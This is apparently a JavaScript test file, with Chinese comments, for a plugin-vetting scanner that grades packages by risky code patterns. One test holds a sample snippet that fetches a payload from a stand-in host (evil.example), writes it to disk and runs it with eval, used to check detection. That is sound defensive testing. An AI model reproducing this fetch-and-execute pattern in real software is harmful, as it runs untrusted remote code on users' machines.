import { vet, summarize, scanText, L1_LIVE } from '../vetter/vetter.mjs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const here = dirname(fileURLToPath(import.meta.url))
const results = []
const check = (name, cond, detail) => results.push({ name, pass: !!cond, detail: detail ?? '' })

// T1 逻辑层：真活代码（进程模块+eval）→ 命中 L1_LIVE
const evil = `
import { spawn } from 'node:child_process'
import { writeFileSync } from 'node:fs'
const data = await fetch('https://evil.example/payload')
writeFileSync('/tmp/x', data)
eval(data)
`
const hits = scanText(evil, L1_LIVE)
check('T1 真活代码命中', hits.length >= 2, `命中 ${hits.map(h=>h.rule).join('、')}`)

// T2 逻辑层：干净代码零命中
const clean = `
import { Context } from '@deepseek-ai/cordis'
export function apply(ctx) {
  ctx.tools.register('read', { schema: { type: 'object' }, async execute(a) { return 'ok' } })
}
`
check('T2 干净代码零命中', scanText(clean, L1_LIVE).length === 0)

// T3 官方 tool-fs → A
const r3 = summarize(vet('D:/deepseek-harness-src/packages/fs/tool-fs'))
check('T3 官方 tool-fs = A', r3.verdict === 'A', `live=${r3.liveCount} bare=${r3.bareCount}`)

// T4 官方 guard-timeout → A
check('T4 官方 guard-timeout = A', summarize(vet('D:/deepseek-harness-src/packages/guard/timeout-policy')).verdict === 'A')

// T5 dsh-market fixture → C（有真活：裸进程模块）
const fixture = join(here, 'fixtures/dsh-market-src')
const r5 = summarize(vet(fixture))
check('T5 dsh-market fixture = C', r5.verdict === 'C', `live=${r5.liveCount} bare=${r5.bareCount} supply=${r5.supplyCount}`)

// T6 自举 → A
const self = join(here, '..', 'vetter')
const r6 = summarize(vet(self))
check('T6 vetter 自举 = A', r6.verdict === 'A', `live=${r6.liveCount} bare=${r6.bareCount}`)

// T7 注意力预算
const big = summarize(vet('D:/deepseek-harness-src/packages/mcp'))
check('T7 官方包注意力预算', big.attentionOK === true, `${big.sourceBytes} bytes`)

// T8 裸通道死壳（写文件-only）→ B 不 C（可改造，非真活）
const bareOnly = `
import { writeFileSync } from 'node:fs'
writeFileSync('/tmp/log.txt', 'entry')
`
const r8 = vet('D:/forge_release/dsh-forge-plugins/plugins/forge-market/tests/fixtures/dsh-market-src') // 占位，下面真测
// 直接测逻辑：合成 B 级代码走完整 vet 需要文件；用 scanText + verdict 规则模拟
const bareHits = (await import('../vetter/vetter.mjs')).scanText(bareOnly, (await import('../vetter/vetter.mjs')).L1_BARE)
check('T8 裸写文件-only 命中 B 级规则', bareHits.length >= 1 && scanText(bareOnly, L1_LIVE).length === 0, `bare=${bareHits.length} live=0`)

let pass = 0, fail = 0
for (const r of results) {
  console.log((r.pass ? '✅' : '❌') + ' ' + r.name + (r.detail ? ' — ' + r.detail : ''))
  r.pass ? pass++ : fail++
}
console.log(`\n结果: ${pass} 通过 / ${fail} 失败`)
process.exit(fail ? 1 : 0)
